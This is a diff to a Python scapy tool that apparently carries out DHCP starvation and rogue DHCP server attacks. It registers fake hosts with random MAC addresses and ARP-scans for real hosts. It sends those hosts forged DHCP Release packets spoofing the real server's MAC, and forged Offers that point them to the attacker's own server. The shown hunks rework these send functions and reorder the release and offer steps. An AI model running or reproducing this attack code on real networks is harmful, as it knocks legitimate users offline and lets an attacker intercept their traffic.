@@ -135,21 +135,22 @@ def get_hosts_from_network(ip_address, netmask):
     address_list = [str(ip_address) for ip_address in network.hosts()] 
     return address_list
 
-
+'''
 def get_transaction_id():
     """
     Returns a 32-bit random number following DHCP Transaction ID format
     """
     transaction_id = random.getrandbits(32)
     return transaction_id
-
+'''
 
 def create_fake_host():
     """
     Creates a fake host with random MAC address and Trans ID
     """
     # Getting fresh random MAC addr and transaction ID for all the DHCP transaction process for this fake host
-    trans_id = get_transaction_id()
+    #trans_id = get_transaction_id()
+    trans_id = random.getrandbits(32)
     mac_address = get_random_mac()
     # Creating a new fake host with no assigned IP address 
     host = fake_host(mac_address, trans_id)
@@ -258,7 +259,8 @@ def send_release(host_mac, ip_address):
     Send DHCP Release
     """
     # Getting a random Trans ID
-    trans_id = get_transaction_id()
+    trans_id = random.getrandbits(32)
+    #trans_id = get_transaction_id()
     # Converting MAC addresses
     mac_address = int(host_mac.replace(":", ""), 16).to_bytes(6, "big")
     server_mac = int(dhcp_server_mac.replace(":", ""), 16).to_bytes(6, "big")
@@ -292,18 +294,22 @@ def send_offer(host_mac, ip_address):
     WORK IN PROGRESS
     """
     # Getting a random Trans ID
-    trans_id = get_transaction_id()
+    trans_id = random.getrandbits(32)
+    #trans_id = get_transaction_id()
     # Converting MAC addresses
     dst_mac_address = int(host_mac.replace(":", ""), 16).to_bytes(6, "big")
-    src_mac_address = int(our_mac_address.replace(":", ""), 16).to_bytes(6, "big")
+    #src_mac_address = int(our_mac_address.replace(":", ""), 16).to_bytes(6, "big")
+    src_mac_address = int(dhcp_server_mac.replace(":", ""), 16).to_bytes(6, "big")
     # Making DHCP Release packet
     ether_header = scapy.Ether(src=src_mac_address, 
                                dst=dst_mac_address)
-    ip_header = scapy.IP(src="192.168.255.1", # Our own DHCP server's IP address
+    ip_header = scapy.IP(src="10.0.0.250", # Our own DHCP server's IP address
                          dst=ip_address)
     udp_header = scapy.UDP(sport=67, 
                            dport=68)
-    bootp_field = scapy.BOOTP(chaddr=host_mac, 
+    bootp_field = scapy.BOOTP(chaddr=dst_mac_address,
+                              yiaddr="192.168.255.100", 
+                              siaddr="192.168.255.1",
                               xid=trans_id,
                               flags=0)
     dhcp_field = scapy.DHCP(options=[("message-type", "offer"),
@@ -462,7 +468,7 @@ def get_dhcp_options(packet):
             pass
     return dhcp_opts_dict
 
-
+'''
 def set_promiscuous_mode(enable):
     """
     Enables/disable promiscuous mode on selected interface
@@ -474,7 +480,7 @@ def set_promiscuous_mode(enable):
     else:
         ip.link('set', index=idx, promisc=0)
     ip.close()
-
+'''
 
 def remove_unused_fake_hosts():
     """
@@ -515,7 +521,8 @@ def renew_hosts_ip_leases():
     for host in fake_host_dict.values():
         if is_ip_renew_needed(host.lease_time, host.acquisition_time) and host.ip_adquired == True:
             # Resetting Transaction ID
-            host.transaction_id = get_transaction_id()
+            #host.transaction_id = get_transaction_id()random.getrandbits(32)
+            host.transaction_id = random.getrandbits(32)
             # Unicast DHCP Request to renew IP address lease
             send_renewal_request(host)
     #remove_unused_fake_hosts()
@@ -612,10 +619,10 @@ def perform_arp_scan(network):
             # Checking if discovered host is not DHCP server or not already spoofed
             if ip != dhcp_server_ip and mac not in spoofed_hosts.keys():
                 write_to_log(f"ARP Scan: Found non-spoofed host {ip} - {mac}")
+                # Send DHCP Offer to try to assign own DHCP server's IP address to host
+                send_offer(mac, ip)
                 # Send DHCP Release to force a new IP address adquisition by the host
                 send_release(mac, ip)
-                # Send DHCP Offer to try to assign own DHCP server's IP address to host
-                send_offer(mac, "192.168.255.150")
                 # Wait for t seconds and try to catch that released IP address
                 pool_exhaustion_with_discover(1, 5)
                 # Create a new ficticious host matching found real host
@@ -737,7 +744,7 @@ def main():
     write_to_log(f"There's a total of {max_hosts} possible hosts")
     
     # Enabling promisc mode on selected interface (just in case)
-    set_promiscuous_mode(True)
+    #set_promiscuous_mode(True)
 
     # Starting asynchronous DHCP packet sniffer
     dhcp_sniffer = scapy.AsyncSniffer(filter="udp and (port 67 or 68)", prn=handle_dhcp_packet)
@@ -783,7 +790,7 @@ def main():
         threading.Thread(target=ip_lease_renewal).start()
         # Infinite loop to maintain threads running
         while True:
-            time.sleep(10)
+            time.sleep(5)
 
     except Exception as e:
         # If an exception occurs (p.e. KeyboardInterrupt Ctrl+C) all IP's will be released
@@ -792,10 +799,11 @@ def main():
         finish_program = True
         sys.exit(0)
     finally:
+        time.sleep(5)
         # Releasing all IP addresses
         release_all_ips()
         # Disabling promiscuous mode
-        set_promiscuous_mode(False)
+        #set_promiscuous_mode(False)
         write_to_log(f"Service terminated")
     
 
